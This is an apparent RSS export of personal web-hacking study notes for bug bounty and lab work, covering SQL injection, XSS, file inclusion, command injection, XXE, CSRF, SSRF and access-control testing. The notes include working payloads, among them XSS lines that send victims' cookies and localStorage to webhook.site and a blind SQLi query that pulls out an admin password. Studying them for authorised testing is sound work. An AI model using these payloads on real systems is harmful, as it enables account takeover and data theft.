+e.g. : If an app allows language change, we can instead of sending Russian as input, we send ../../../ to achieve directory traversal, allowing us to travel back up to the root directory, and then appending etc/passwd to include the passwd file Sometimes controls are put in place to prevent that from happening, but some controls such as removing ../ if not done recursively may be ineffective. LFI : etc/passwd
+../../../etc/passwd RFI : http://attacker.com/malicious.php //to execute a remote shell You can use PHP wrappers ( e.g. php://filter that allows us to read php files ) to bypass restrictions, Double encoding, recursive payloads ( adding a ../ between each .&lt;it goes here&gt;./ ) etc.
+It's really good to know what language is being used server-side (PHP, JSP, ASP, etc.)
+We can also consider Fuzzing
+More payloads can be found in the PayloadsAllTheThings repo on GitHub One of the first thing we would do to check for SQLi is to test with " and ' since they can break the SQL statement and return an error .
+Next we would try Logical operators : AND &amp; OR .
+Whenever you're thinking about SQLi, Also think about everything you're supplying to the application (headers, cookies etc.) and how it might be used : e.g. if the app automatically detects your browser, and says hey I suggest this plugin instead of this, you might think &gt; Maybe it's using the User-Agent: and processing it in some way, and then you would suspect the user agent and start testing it.
+Maybe it's the cookie, and so on. # and -- - (for MYSQL) : It ends the SQL query, so anything after this gets ignored.
+Their syntax is different for each DB . It let's us retrieve info from other tables and columns that were not initially defined.
+It has a constraint and it's that when we UNION SELECT we can ONLY select the same number in the original query. So if in the original query we're selecting let's say username and password well that's 2 columns then we can only union select 2 items.
+To know the number of those columns we would use null , e.g. jeremy' union select null-- - and we keep incrementing the number of null till we get a normal response : jeremy' union select null,null,null-- - One other constraint is that we can only select 1 type of data so for example : Only integers or only strings etc. , if the data that we're trying to get (e.g. email &gt; string and ID &gt; integer ) we will get an Error Note : the syntax differs from a DB to another : version() &gt; _to get the version of the DB used
+table_name from information_schema.tables &gt; _to get the table names from the DB
+column_name from information_schema.columns &gt; _to get the column names You can check PORTSWIGGER SQL cheat sheet for those diff syntax. It's a tool that tests for SQLi &gt; sqlmap -r req.txt or you can use a url instead, for more info enter the following command in the terminal : sqlmap -h
+To inject for some specific stuff like cookies you would need to increase the level to at least 2 &gt; --level=2 It's called Blind since the : query is only changing the behavior of the app, it won't give us back any data, it wonly only give us a change in behavior So we will have to create payloads that produce true false output, and based on the behavior, we can slowly extract data (e.g. is the first character of the password is a ) The function we use to get the information is called : substring and it's syntax is the following : substr(string, start, length) or substr(string from start for length) : ' and substr("voidpacket", 1, 1) = "v"# &gt; This should return true since the first char in the string is v .
+' and substr("voidpacket", 1, 3) = "voi"# &gt; This should return true since the first char in the string is voi .
+But here we don't want to use strings that we provide, we want strings provided by the DB, so our payload will look like this :
+' and substr((select version()), 1, 1) = "8"#
+' and substr((select password from injection0x02 where username = 'admin'), 1, 1) = 'a'# Remember that sometimes when comparing Upper case letters with Lower Case Letters can still return true . The theory behind it is that you deliver your payload, but it only executes later, e.g. : Creating an account : username and password, but inject it with SQL payload, which will be stored in the DB and we can execute it later. sqlmap has an option for Second Order SQL Testing It's a vulnerability that let's us executes JavaScript code in a victim's browser, and often gives us control over the app for that user. Reflected &gt; When the script we're injecting comes from the current HTTP request : our script is included in the request It's limiting since we can only target ourselves Stored &gt; When the payload is stored in the DB or something and then we can retrieve it later.
+DOM-Based &gt; When the client-side has some vulnerable JavaScript that uses untrusted input instead of having a vulnerability serve-side Everything happens locally in the browser : so when you take a look at the Network section in the dev tools, and you send your payload, the page doesn't get refreshed. It's better to test for HTML injection first, since if it works XSS injection will work.
+It's better to not use alert() as it often gets filtered, instead use : print() &gt; which will pop up a print box. or prompt() &gt; which will pop up a prompt box.
+We can also use A to B testing to test for stored XSS : it's helpful to use containers ( the best method in my opinion is using the <a data-tooltip-position="top" aria-label="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/" rel="noopener nofollow" class="external-link is-unresolved" href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/" target="_self">Firefox multi-account containers</a>). &lt;script&gt;prompt(1)&lt;/script&gt; &lt;img src=x onerror=prompt()&gt; &lt;img src=x onerror="window.location.href = '&lt;evil.com&gt;'" To get for example another user's or admin's cookie we can use a webhook : Use netcat, collaborator in burp or a website like webhook.site to receive the response. Just know that we should not be using third party websites if we're doing bugbounty or pentest, instead we can use a ec2 instance or if we're using vpn we can just use our local machine <br>
+Syntax vary when it come to advanced Payloads : this is a payload that i used in a CTF challenge in one of my favorite platforms : <a data-tooltip-position="top" aria-label="https://bugforge.io/" rel="noopener nofollow" class="external-link is-unresolved" href="https://bugforge.io/" target="_self">BugForge</a> , you can find the full documentation on my <a data-tooltip-position="top" aria-label="https://github.com/VOIDPACKET-VP/Labs-Documentation/blob/main/bugForge/Stored%20Cross-Site%20Scripting%20(XSS)%20to%20Account%20Takeover.md" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/VOIDPACKET-VP/Labs-Documentation/blob/main/bugForge/Stored%20Cross-Site%20Scripting%20(XSS)%20to%20Account%20Takeover.md" target="_self">Labs-Documentation</a> repo : &lt;img src=x onerror="fetch('https://webhook.site/YOUR-ID?test=execute&amp;cookie='+encodeURIComponent(document.cookie)+'&amp;localStorage='+encodeURIComponent(JSON.stringify(localStorage)));" &lt;script&gt;var i = new Image; i.src = "https://webhook.site/YOUR-ID/?"+ document.cookie;&lt;/script&gt; <br>
+Obviously learning JavaScript is very important if you want to level up your payload crafting skills, some of the best resources to learn it are : <a data-tooltip-position="top" aria-label="https://scrimba.com/t0js" rel="noopener nofollow" class="external-link is-unresolved" href="https://scrimba.com/t0js" target="_self">Scrimba</a> , <a data-tooltip-position="top" aria-label="https://jsmastery.com" rel="noopener nofollow" class="external-link is-unresolved" href="https://jsmastery.com" target="_self">JavaScript Mastery</a> etc. <br>
+More can be found in <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_self">PayloadsAllTheThings</a> repo and <a data-tooltip-position="top" aria-label="https://book.hacktricks.wiki/en/index.html" rel="noopener nofollow" class="external-link is-unresolved" href="https://book.hacktricks.wiki/en/index.html" target="_self">HackTricks</a> It's a very serious vulnerability, if we find it we can often compromise the entire application and the host. The app is taking user input and passing it to a function that executes it as code, one of those functions are : eval() eval is evil . When we think about command injection, we think about : Can we chain commands ?
+Is the command that's being used where our code is being appended, can we add something that gets executed ? ; whoami which php //to check what PHP version is being used
+ls||id; ls ||id; ls|| id; ls || id We can also add # to comment out what comes after our code &gt; ; whoami ;# <br>You can find some Reverse shell paylaods on <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_self">PayloadsAllTheThings</a> and <a data-tooltip-position="top" aria-label="https://book.hacktricks.wiki/en/index.html" rel="noopener nofollow" class="external-link is-unresolved" href="https://book.hacktricks.wiki/en/index.html" target="_self">HackTricks</a>, just know that you will need a listener : use netcat &gt; nc -nvlp &lt;PORT&gt; .
+NOTE THAT : Popping a shell is most of the times OUT OF SCOPE in bug bounties &gt; so check the scope and rules of engagements of the program you're working on. As every blind injection : we inject our code but the result don't get reflected back to us, so we can use some different payloads to test for it: "sleep 10"
+https://webhook.site/YOUR-ID?q="&lt;code-to-execute (e.g. sleep 10)&gt;" So a template engine allows us to separate the Presentation Layer from the Logic Layer in our application. Some popular template engines are : Ginger2
+Twig
+Erb
+Free Marker
+etc. <br>
+NOTE : I've made a more deep guide on SSTI which i highly recommend you to check and read &gt; <a data-tooltip-position="top" aria-label="https://github.com/VOIDPACKET-VP/VOIDPACKET-Web-Galaxies/blob/main/Cosmic%20Phenomena/SSTI%20Solar%20Flares.md" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/VOIDPACKET-VP/VOIDPACKET-Web-Galaxies/blob/main/Cosmic%20Phenomena/SSTI%20Solar%20Flares.md" target="_self">SSTI Solar Flares</a>, Since i won't be going over it here. THANK YOU. Some apps use XML to transfer data. This format has a specification that contains potentially dangerous features and parsers that process the data vulnerably.
+An external entity is a custom entity whose definition is outside the document and therefore needs to be located when the XML file is passed.
+This is not something that we find often anymore, since teams have added patches and filters etc. but it's worth testing for if an app is accepting and passing XML.
+Sometimes API endpoints might except XML data instead of JSON, situations like this are often overlooked and therefore greater bounty rewards. &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt; It's a vulnerability where we mostly want to achieve code execution after uploading a file
+Apps put some checks (to look for allowed formats etc. ), so we can intercept the request and change the file format, just know that you will need to modify the Content-Type header to match that format. Now here there is no rule, you will need to try and understand how the app is deciding whether the format is valid or not : Sometimes it can be as simple as appending another format : evil.php.png , or maybe add a null byte : evil.php%00.png The other way can be uploading a special file like an .htaccess file that allows us to execute files like : .asd as though they were PHP files. One other way is to check the magic bytes which are the first bytes of the file that tells the system what kind of file it is ( you can search for them ). So what we can do is : insert the payload inside the file data, under of course the magic bytes.
+change the format to .php since we need it to execute
+If we keep getting an error when we wanna execute the code, we can strip a bit of data from that file. It's an attack where we can trick users into performing an action within a web app where that user is authenticated to (e.g. changing account settings, transferring funds etc.) Let's use a simple scenario: We need a legitimate session : whenever a user interacts with the app, the browser automatically send a session cookie so that the server know the request came from that exact user.
+That user visits a malicious site (from general browsing, phishing, a site that's vulnerable to XSS and was forwarded there etc.)
+That site (malicious site) contains a script that sends a request to the first site (the legit site) to make a transaction. This action is carried out on the user's browser because his browser is still authenticated to the app. We can of course use CSRF tokens and Same site cookies to protect against this vulnerability. Example of changing email (this won't work for you, so tweak it) :
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action="&lt;Where-to-send&gt;" method="post"&gt;
+&lt;input type="text" name="email" value="&lt;value-goes-here&gt;"&gt;
+&lt;button type="submit"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;
+&lt;script&gt;
+window.onload = function(){
+document.forms[0].submit;
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt; You can also use Burp Suite's engagement tool (it's for the paid version only) When we meet with an app that uses CSRF tokens we need to think about : Do we have XSS ? &gt; if yes then we can send a request and steal the CSRF token, and inject that into our POST request and then send it on it's way.
+Not all CSRF tokens are equal : what happens if i submit an old token ? is the logic of the app checking the value of the token ? or is it just checking if a token exists ? what if i send a very long or short token ?
+<br>Check <a data-tooltip-position="top" aria-label="https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection" rel="noopener nofollow" class="external-link is-unresolved" href="https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection" target="_self">AppSecExplained</a> for more stuff to check. It allows us to induce the server to make requests on our behalf. Let's use a simple example : Let's consider an app that fetches and displays images from URLs (The user provides the URL, and the app retrieves the image from it)
+So instead of supplying a legit URL, we might supply a URL to an internal system (which are generally not accessible for us, but not for the app). We need to know where should we redirect the app, so with some endpoint fuzzing we might find some interesting endpoints and make the app fetches for it. We can fuzz for IPs, then if we find an alive host, we can fuzz for open PORTs (It's better to automate this task) Demonstrating impact of blind SSRF can be tricky, sometimes we can exfiltrate data via out of band channels, bypass firewalls. When we take control of an organization's subdomain due to a misconfiguration or oversight : An organization sets up a subdomain blog.example.com and points it to a third-party hosting platform.
+When they decide to stop using that hosting platform and deletes it's accounts, they often forgets to update or remove the DNS entry pointing to it.
+Now we can claim that subdomain. A 404 Not Found doesn't always means we have a subdomain takeover, but it's worth investigating Similar to SSRF, we are looking for a URL or a partial URL .
+To exploit it we need to host a malicious page where we want to send our user, Update that URL to the malicious one, and send it to the user.
+A pretty common one is to send users to a page where it has a login form so that we can steal them Web apps mostly use third party tools, which they can introduce potential vulns if they're outdated, misconfigured etc. .
+We can find them by simply listing all of the third party plugins the app uses with tools like : builtwith, Whapplizer, DevTools etc.
+Then we also need to check their version information, which can be found in readme files, source code, licenses or sometimes in the footer of the app etc.
+Then we can search for there CVEs etc. but doing this manually is very time consuming, so automating this process is encouraged
+]]></description><link>offense-galaxies/web-hacking-galaxies/injection-galaxy.html</link><guid isPermaLink="false">VOIDPACKET-Web-Galaxies/Galaxies/Offense-Galaxies/Web-Hacking-Galaxies/Injection-Galaxy.md</guid><pubDate>Sun, 14 Dec 2025 21:56:22 GMT</pubDate></item><item><title><![CDATA[Auth-Galaxy]]></title><description><![CDATA[
+Authentication is : It's who you are : your identity . Authorization is : It's what you are allowed to do . Authentication can be bypassed using brute forcing. Sometimes our requests can get throttled, so we might wanna use different headers that trick the server into thinking that we are a different user, one of those headers is : X-Forwarded-For There are different ways to go around this :
+2. Sometimes the lock out gets counted per username : so we can use few usernames but with a lot of passwords and start the fuzzing Whenever we have multistep login (e.g. MFA, 2FA ...) we start thinking on what edge cases there could be : Does that token apply to multiple users.
+Is the token weak and can be brute forceable.
+Does the token expire, can i use it multiple times. You can check Alex's checklist for MFA in his website : <a data-tooltip-position="top" aria-label="https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection" rel="noopener nofollow" class="external-link is-unresolved" href="https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection" target="_self">Appsecexplained</a> Vertical access control Restrict functionalities to some specific users (e.g. Restricting a costumer from editing a product) Horizontal access control Restrict access to resources for a specific user (e.g. A user can update there own account but not another user's) Context-Dependent access control It allows or restrict access based on the app's current state (e.g. An app may not allow you to Checkout if there is nothing in your cart) It's when the app is returning info based on an object ID.
+When dealing with APIs, we call it BOLA
+The best way to test for this in bug bounty is to make multiple accounts ( A to B testing ) So if we see an ID in user A, we would substitute it with the user B's ID.
+If it works, we can also try stuff like updating accounts etc. API driven apps behave in a slightly different way, and so we approach them differently.
+The API fetches data, and the data is processed Client-side. It's a burp plugin, helps with testing for Broken access control.
+It basically allows you to send requests with a different user's token but as You.
+It shows you either a BYPASSED status or a Enforced status, we are looking for the Bypassed one of course ]]></description><link>offense-galaxies/web-hacking-galaxies/auth-galaxy.html</link><guid isPermaLink="false">VOIDPACKET-Web-Galaxies/Galaxies/Offense-Galaxies/Web-Hacking-Galaxies/Auth-Galaxy.md</guid><pubDate>Sun, 14 Dec 2025 15:47:21 GMT</pubDate></item></channel></rss>
